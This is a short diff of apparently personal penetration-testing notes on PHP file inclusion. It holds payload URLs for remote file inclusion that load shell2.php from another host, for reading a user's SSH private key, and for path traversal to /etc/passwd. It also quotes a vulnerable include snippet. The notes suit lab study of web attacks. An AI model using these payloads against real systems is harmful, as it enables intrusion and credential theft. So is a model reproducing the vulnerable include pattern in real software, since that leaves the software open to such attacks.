@@ -22,3 +22,15 @@ http://10.11.1.35/section.php?page=http://192.168.119.172/shell2.php
 
 #Search for local ssh private keys
 http://192.168.124.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
+
+#Example:
+#Vulnerable code
+    if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
+        error_reporting(E_ALL ^ E_WARNING);
+        include  $_GET['show'] . $ext;
+    } else {
+        echo 'You can select either one of these only';
+    }
+--> Exploit
+ http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd 
+
